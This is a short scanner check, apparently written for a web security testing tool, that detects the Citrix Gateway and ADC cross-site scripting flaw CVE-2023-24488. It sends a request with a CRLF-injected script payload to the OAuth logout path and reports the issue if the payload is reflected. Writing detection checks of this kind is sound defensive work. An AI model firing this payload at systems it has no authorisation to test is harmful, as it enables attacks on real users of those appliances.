metadata:
    language: v1-beta
    name: "CVE-2023-24488 - XSS"
    description: "Tests for Citrix Gateway and Citrix ADC XSS"
    author: "@hackinsec"


given host then
    send request called xsscheck:
        method: "GET"
        path: "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(XSS)</script>"

    if "<script>alert(XSS)</script>" in {xsscheck.response.body} then
        report issue:
            severity: medium
            confidence: certain
            detail: `Citrix Gateway and Citrix ADC - Cross-Site Scripting(XSS)`
            remediation: "Update to latest patch"
    end if
